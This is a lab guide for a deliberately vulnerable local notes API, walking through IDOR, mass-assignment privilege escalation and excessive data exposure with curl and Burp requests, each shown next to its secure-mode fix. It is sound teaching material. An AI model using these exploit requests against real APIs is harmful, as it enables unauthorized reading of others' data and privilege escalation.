# Lab Guide — Step-by-Step Walkthrough

This guide walks you through demonstrating each of the three vulnerabilities on a running instance of the lab.

**Safety reminder:** Use this lab only on `http://127.0.0.1:3000` — the localhost API you control. Never use these techniques against systems you do not own or are not authorized to test.

---

## Prerequisites

- Lab running and seeded with test data
- `curl` installed (macOS/Linux/WSL)
- `jq` installed (optional, for JSON parsing)

### Starting the lab

```bash
# Secure mode (default, fail-closed)
pnpm dev

# Vulnerable mode (explicitly opt-in)
pnpm lab:vulnerable

# The server will print to stderr when in vulnerable mode:
# ############################################################
# #  WARNING: LAB_MODE=vulnerable                            #
# #  ...
# ############################################################
# Listening on http://127.0.0.1:3000 (LAB_MODE=vulnerable)
```

When `LAB_MODE` is unset, the lab starts in **secure mode**. The shipped `.env.example` sets `LAB_MODE="vulnerable"` explicitly to opt in to the vulnerable build. Always verify the mode by calling `curl http://127.0.0.1:3000/health | jq '.labMode'`.

In another terminal, run the curl commands below.

---

## Setup: Get Tokens

You need authentication tokens for Alice and Bob before each walkthrough.

### With jq (recommended)

```bash
# Get Alice's token
ALICE_TOKEN=$(curl -s -X POST http://127.0.0.1:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@example.local","password":"Password123!"}' | jq -r '.token')

echo "Alice token: $ALICE_TOKEN"

# Get Bob's token (for comparison tests)
BOB_TOKEN=$(curl -s -X POST http://127.0.0.1:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"bob@example.local","password":"Password123!"}' | jq -r '.token')

echo "Bob token: $BOB_TOKEN"
```

### Without jq (manual parsing)

```bash
# Get the full response and copy the token manually
curl -X POST http://127.0.0.1:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@example.local","password":"Password123!"}'

# Output:
# {"user":{"id":1,"name":"Alice",...},"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}

# Copy the token and set it:
ALICE_TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
```

### Verify tokens work

```bash
curl http://127.0.0.1:3000/api/users/me \
  -H "Authorization: Bearer $ALICE_TOKEN" | jq '.user.name'

# Output: "Alice"
```

---

## Vulnerability 1: IDOR — Read Another User's Note

### Vulnerable Mode

#### What Alice owns

```bash
curl http://127.0.0.1:3000/api/notes \
  -H "Authorization: Bearer $ALICE_TOKEN" | jq '.notes[].id'
```

Output:

```
3
2
1
```

Alice owns notes 1, 2, 3.

#### Alice reads her own note (should work)

```bash
curl http://127.0.0.1:3000/api/notes/1 \
  -H "Authorization: Bearer $ALICE_TOKEN" | jq '.note'
```

Output:

```json
{
  "id": 1,
  "title": "My private deployment checklist",
  "content": "Draft steps for the next release.",
  "userId": 1,
  "createdAt": "2024-01-15T10:00:00.000Z",
  "updatedAt": "2024-01-15T10:00:00.000Z"
}
```

✅ Success — Alice owns this note.

#### Alice reads Bob's note (should NOT work, but does)

Bob owns notes 4, 5, 6. Alice tries to read note 4:

```bash
curl http://127.0.0.1:3000/api/notes/4 \
  -H "Authorization: Bearer $ALICE_TOKEN" | jq '.note'
```

Output:

```json
{
  "id": 4,
  "title": "Private project notes",
  "content": "Ideas for a side project, still early.",
  "userId": 2,
  "createdAt": "2024-01-15T10:10:00.000Z",
  "updatedAt": "2024-01-15T10:10:00.000Z"
}
```

🔴 **Exploit succeeded** — Alice read Bob's private note without permission.

### Secure Mode

Restart the lab in secure mode:

```bash
# Stop the vulnerable instance (Ctrl+C)
# Then:
pnpm lab:secure
```

Get a fresh token for Alice (it should be the same, but freshness is good):

```bash
ALICE_TOKEN=$(curl -s -X POST http://127.0.0.1:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@example.local","password":"Password123!"}' | jq -r '.token')
```

#### Alice's note (still works)

```bash
curl http://127.0.0.1:3000/api/notes/1 \
  -H "Authorization: Bearer $ALICE_TOKEN" | jq '.note'
```

Output:

```json
{
  "id": 1,
  "title": "My private deployment checklist",
  "content": "Draft steps for the next release.",
  "userId": 1,
  "createdAt": "2024-01-15T10:00:00.000Z",
  "updatedAt": "2024-01-15T10:00:00.000Z"
}
```

✅ Happy path still works.

#### Bob's note (now blocked)

```bash
curl http://127.0.0.1:3000/api/notes/4 \
  -H "Authorization: Bearer $ALICE_TOKEN" | jq
```

Output:

```json
{
  "error": {
    "message": "Note not found",
    "code": "NOT_FOUND"
  }
}
```

✅ **Fix verified** — Alice cannot read Bob's note anymore. The endpoint returns `404` for both "note doesn't exist" and "note exists but isn't yours."

---

## Vulnerability 2: Mass Assignment — Privilege Escalation

### Vulnerable Mode

Ensure you have Alice's token.

#### Check Alice's current role

```bash
curl http://127.0.0.1:3000/api/users/me \
  -H "Authorization: Bearer $ALICE_TOKEN" | jq '.user.role'
```

Output:

```
"USER"
```

#### Attempt privilege escalation

Send a PATCH request with `{"role":"ADMIN"}`:

```bash
curl -X PATCH http://127.0.0.1:3000/api/users/me \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"ADMIN"}' | jq '.user'
```

Output:

```json
{
  "id": 1,
  "name": "Alice",
  "email": "alice@example.local",
  "role": "ADMIN",
  "createdAt": "2024-01-15T10:00:00.000Z"
}
```

🔴 **Exploit succeeded** — Alice is now an ADMIN.

#### Verify the escalation persists

Without re-logging in, check the role again:

```bash
curl http://127.0.0.1:3000/api/users/me \
  -H "Authorization: Bearer $ALICE_TOKEN" | jq '.user.role'
```

Output:

```
"ADMIN"
```

✅ **Confirmed** — The escalation is permanent. The auth middleware reads the role from the database on every request, so the change is immediate.

#### Combined attack (legitimate field + injection)

Try sending both `name` and `role`:

```bash
curl -X PATCH http://127.0.0.1:3000/api/users/me \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"Alice2","role":"ADMIN"}' | jq '.user'
```

Output:

```json
{
  "id": 1,
  "name": "Alice2",
  "email": "alice@example.local",
  "role": "ADMIN",
  "createdAt": "2024-01-15T10:00:00.000Z"
}
```

Both changes are applied. The attacker hides the injection in a legitimate-looking field.

### Secure Mode

Restart the lab:

```bash
pnpm lab:secure
```

Get a fresh token:

```bash
ALICE_TOKEN=$(curl -s -X POST http://127.0.0.1:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@example.local","password":"Password123!"}' | jq -r '.token')
```

#### Check Alice's role (should be USER)

```bash
curl http://127.0.0.1:3000/api/users/me \
  -H "Authorization: Bearer $ALICE_TOKEN" | jq '.user.role'
```

Output:

```
"USER"
```

#### Attempt escalation (now blocked)

```bash
curl -X PATCH http://127.0.0.1:3000/api/users/me \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"ADMIN"}' | jq
```

Output:

```json
{
  "error": {
    "message": "Validation failed",
    "code": "VALIDATION_ERROR",
    "details": [
      { "path": "role", "message": "Unrecognized key: \"role\"" },
      { "path": "(root)", "message": "At least one of name or email is required" }
    ]
  }
}
```

✅ **Fix verified** — The request fails with a `400 VALIDATION_ERROR`. The `role` key is rejected as unknown, and the request is missing a valid field (`name` or `email`).

#### Legitimate update still works

```bash
curl -X PATCH http://127.0.0.1:3000/api/users/me \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"Alice Updated"}' | jq '.user'
```

Output:

```json
{
  "id": 1,
  "name": "Alice Updated",
  "email": "alice@example.local",
  "role": "USER",
  "createdAt": "2024-01-15T10:00:00.000Z"
}
```

✅ **Happy path works** — Alice can update her name. Role remains `"USER"`.

---

## Vulnerability 3: Excessive Data Exposure

### Vulnerable Mode (LAB_MODE=vulnerable)

Ensure you have Alice's token.

#### Fetch Alice's profile

```bash
curl http://127.0.0.1:3000/api/users/me \
  -H "Authorization: Bearer $ALICE_TOKEN" | jq '.user'
```

Output:

```json
{
  "id": 1,
  "name": "Alice",
  "email": "alice@example.local",
  "passwordHash": "$2b$12$r/o4ovHxtE1V4OfwNDczJuSJuXXvDVqUZVxLH1hjvBCKDrjJsxWdO",
  "role": "USER",
  "resetToken": "lab-not-a-real-secret-reset-token-alice",
  "createdAt": "2024-01-15T10:00:00.000Z",
  "updatedAt": "2024-01-15T10:00:00.000Z"
}
```

🔴 **Exploit revealed** — The response includes sensitive fields:

- **`passwordHash`** — The bcrypt-hashed password. An attacker can try to crack it offline.
- **`resetToken`** — In a real app, this would reset the password without the current password.
- **`updatedAt`** — Metadata that reveals when the account was last modified.

#### Check the response shape

```bash
curl -s http://127.0.0.1:3000/api/users/me \
  -H "Authorization: Bearer $ALICE_TOKEN" | jq '.user | keys | sort'
```

Output:

```json
["createdAt", "email", "id", "name", "passwordHash", "resetToken", "role", "updatedAt"]
```

The response has 8 keys. A secure response should have only 5: `createdAt, email, id, name, role`.

### Secure Mode

Restart the lab:

```bash
pnpm lab:secure
```

Get a fresh token:

```bash
ALICE_TOKEN=$(curl -s -X POST http://127.0.0.1:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@example.local","password":"Password123!"}' | jq -r '.token')
```

#### Fetch Alice's profile (now safe)

```bash
curl http://127.0.0.1:3000/api/users/me \
  -H "Authorization: Bearer $ALICE_TOKEN" | jq '.user'
```

Output:

```json
{
  "id": 1,
  "name": "Alice",
  "email": "alice@example.local",
  "role": "USER",
  "createdAt": "2024-01-15T10:00:00.000Z"
}
```

✅ **Fix verified** — Only the public fields are returned. No `passwordHash`, `resetToken`, or `updatedAt`.

#### Verify the response shape

```bash
curl -s http://127.0.0.1:3000/api/users/me \
  -H "Authorization: Bearer $ALICE_TOKEN" | jq '.user | keys | sort'
```

Output:

```json
["createdAt", "email", "id", "name", "role"]
```

Exactly 5 keys, no sensitive metadata leaked.

---

## Burp Suite Repeater — Interactive Testing

If you have Burp Suite or another HTTP proxy, you can test the vulnerabilities interactively.

### Getting Started

1. **Capture a login request** — Start Burp Suite, configure your browser/curl to proxy through it.
2. **Login to get a token** — Intercept and save the login response.
3. **Use the token in Repeater** — Copy the token and paste it into Repeater headers.

### Example: V1 — Read Bob's Note with Burp

```
GET /api/notes/4 HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**Vulnerable mode:** Responds with `200 OK` and Bob's note.
**Secure mode:** Responds with `404 Not Found`.

### Example: V2 — Escalate with Burp

```
PATCH /api/users/me HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Content-Type: application/json

{"role":"ADMIN"}
```

**Vulnerable mode:** Responds with `200 OK` and `"role":"ADMIN"`.
**Secure mode:** Responds with `400` and `details[0].path === "role"`.

### Example: V3 — Check Leaks with Burp

```
GET /api/users/me HTTP/1.1
Host: 127.0.0.1:3000
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**Vulnerable mode:** Response body contains `"passwordHash"` and `"resetToken"`.
**Secure mode:** Response body contains only `id, name, email, role, createdAt`.

---

## Switching Modes

### Via environment variable

```bash
# Stop the current instance (Ctrl+C)

# Vulnerable mode
LAB_MODE=vulnerable pnpm dev

# Secure mode (default)
LAB_MODE=secure pnpm dev
```

### Via npm scripts

```bash
pnpm lab:vulnerable   # Vulnerable mode
pnpm lab:secure       # Secure mode
```

### Check which mode is running

```bash
curl http://127.0.0.1:3000/health | jq '.labMode'
```

---

## Comparing the Code

To see exactly what changes between vulnerable and secure implementations:

```bash
# On the main branch (has both implementations)
git diff vulnerable secure -- src/services src/schemas
```

This shows only the ~40 lines that differ between the two branches.

### Manual code inspection

**V1 — IDOR:**

- **Vulnerable:** `src/services/notes.service.ts` — `getNoteByIdInsecure`
- **Secure:** `src/services/notes.service.ts` — `getNoteByIdSecure`

**V2 — Mass Assignment:**

- **Vulnerable:** `src/services/users.service.ts` — `updateMeInsecure`
- **Secure:** `src/services/users.service.ts` — `updateMeSecure` + `src/schemas/user.schema.ts`

**V3 — Data Exposure:**

- **Vulnerable:** `src/services/users.service.ts` — `getMeInsecure`
- **Secure:** `src/services/users.service.ts` — `getMeSecure`

---

## Regenerating Branches

If you modify `main` and need to update the `vulnerable` and `secure` branches, follow this procedure:

1. **Clean and commit** on `main`:

   ```bash
   pnpm format
   pnpm typecheck
   pnpm lint
   pnpm test
   git add -A
   git commit -m "Update main implementation"
   ```

2. **Create the `vulnerable` branch** — keep insecure paths, delete secure twins, rename to neutral names:

   ```bash
   git switch -c vulnerable main
   # In src/services/notes.service.ts:
   #   - Delete getNoteByIdSecure
   #   - Rename getNoteByIdInsecure to getNoteById
   # In src/services/users.service.ts:
   #   - Delete getMeSecure
   #   - Rename getMeInsecure to getMe
   #   - Delete updateMeSecure
   #   - Rename updateMeInsecure to updateMe
   # In src/routes/notes.routes.ts and src/routes/users.routes.ts:
   #   - Call services directly instead of through selectors (no getNoteById(labMode) call)
   #   - Remove labMode parameter from createNotesRouter and createUsersRouter
   # In src/app.ts:
   #   - Remove labMode parameter from createApp
   #   - Remove labMode from /health response
   # In tests/:
   #   - Rename tests/vulnerable.test.ts to tests/vulnerability.test.ts
   #   - Delete tests/secure.test.ts
   #   - Parameterize tests/auth.test.ts to a single app

   pnpm typecheck && pnpm lint && pnpm test
   git add -A
   git commit -m "Vulnerable branch: strip secure paths"
   ```

3. **Create the `secure` branch** — mirror image:

   ```bash
   git switch -c secure main
   # Keep secure implementations only:
   #   - Delete getNoteByIdInsecure, keep getNoteByIdSecure → rename to getNoteById
   #   - Delete getMeInsecure, keep getMeSecure → rename to getMe
   #   - Delete updateMeInsecure, keep updateMeSecure → rename to updateMe
   # Same route/app changes as vulnerable branch
   # In tests/:
   #   - Delete tests/vulnerable.test.ts
   #   - Rename tests/secure.test.ts to tests/vulnerability.test.ts
   #   - Parameterize tests/auth.test.ts to a single app

   pnpm typecheck && pnpm lint && pnpm test
   git add -A
   git commit -m "Secure branch: strip vulnerable paths"
   ```

4. **Verify the branches**:
   ```bash
   git diff vulnerable secure -- src/services src/schemas
   # Shows exactly three files — notes.service.ts, users.service.ts and user.schema.ts — at 37 insertions and 7 deletions with inline differences
   # File names (e.g., vulnerability.test.ts) should be identical on both branches
   ```

The `vulnerable` branch keeps the startup warning banner in `src/server.ts`; the `secure` branch does not.

---

## Tips for Recording

1. **Run in vulnerable mode** — Demonstrate the exploits on camera.
2. **Show curl commands** — Allow viewers to copy-paste them.
3. **Highlight responses** — Point out leaked data (passwordHash, role changed, etc.).
4. **Switch to secure mode** — Show the same commands fail or return safe data.
5. **Show code side-by-side** — Use a split-screen editor to compare implementations.

### Example script

```bash
# 1. Start vulnerable (without watch mode so kill works reliably)
LAB_MODE=vulnerable pnpm exec tsx src/server.ts &
SERVER_PID=$!
sleep 2

# 2. Get token
TOKEN=$(curl -s -X POST http://127.0.0.1:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@example.local","password":"Password123!"}' | jq -r '.token')

# 3. Show IDOR
echo "=== V1: IDOR ==="
curl http://127.0.0.1:3000/api/notes/4 -H "Authorization: Bearer $TOKEN" | jq

# 4. Show mass assignment
echo "=== V2: Mass Assignment ==="
curl -X PATCH http://127.0.0.1:3000/api/users/me \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"ADMIN"}' | jq '.user.role'

# 5. Show data exposure
echo "=== V3: Data Exposure ==="
curl http://127.0.0.1:3000/api/users/me \
  -H "Authorization: Bearer $TOKEN" | jq '.user | keys'

# 6. Kill and restart in secure
kill $SERVER_PID
wait $SERVER_PID 2>/dev/null || true
sleep 1
LAB_MODE=secure pnpm exec tsx src/server.ts &
SERVER_PID=$!
sleep 2

# 7. Same commands, now safe
echo "=== Secure mode ==="
TOKEN=$(curl -s -X POST http://127.0.0.1:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@example.local","password":"Password123!"}' | jq -r '.token')

curl http://127.0.0.1:3000/api/notes/4 -H "Authorization: Bearer $TOKEN" | jq '.error'
curl -X PATCH http://127.0.0.1:3000/api/users/me \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"ADMIN"}' | jq '.error'
curl http://127.0.0.1:3000/api/users/me \
  -H "Authorization: Bearer $TOKEN" | jq '.user | keys'

# 8. Cleanup
kill $SERVER_PID
```

---

## Resetting the Database

To return to a clean state with Alice and Bob's notes restored:

```bash
pnpm db:reset
```

This:

1. Deletes all users and notes
2. Resets SQLite's autoincrement counters
3. Re-seeds Alice and Bob with their original notes

---

## Troubleshooting

### "Connection refused" on localhost:3000

The lab is not running. Start it:

```bash
pnpm dev
```

### "Invalid or expired token"

The token has expired (default 1 hour). Get a new one:

```bash
ALICE_TOKEN=$(curl -s -X POST http://127.0.0.1:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"alice@example.local","password":"Password123!"}' | jq -r '.token')
```

### Server exits with environment validation error

The `LAB_MODE` environment variable is set to an invalid value (must be `vulnerable` or `secure`). The error appears on startup:

```
Invalid environment configuration:

  - LAB_MODE: Invalid option: expected one of "vulnerable"|"secure"

Check your .env file against .env.example and try again.
```

The server does not start. Fix `.env` to set `LAB_MODE` to a valid value:

```bash
# Edit .env and change LAB_MODE to one of:
LAB_MODE="vulnerable"
LAB_MODE="secure"

# Then restart:
pnpm dev
```

### Database is in a weird state

Rebuild it:

```bash
pnpm db:nuke        # Delete dev.db and recreate with seed
```

---

## Further Learning

- [docs/vulnerabilities.md](vulnerabilities.md) — Deep dive into each bug
- [docs/architecture.md](architecture.md) — System design and LAB_MODE selector
- [../README.md](../README.md) — Project overview
- [../SECURITY.md](../SECURITY.md) — Security policy

---

## References

- [OWASP API Security Top 10 (2023)](https://owasp.org/API-Security/editions/2023/en/0x01-index/)
- [Burp Suite Community Edition](https://portswigger.net/burp/communitydownload)
- [curl documentation](https://curl.se/)
- [jq documentation](https://stedolan.github.io/jq/)
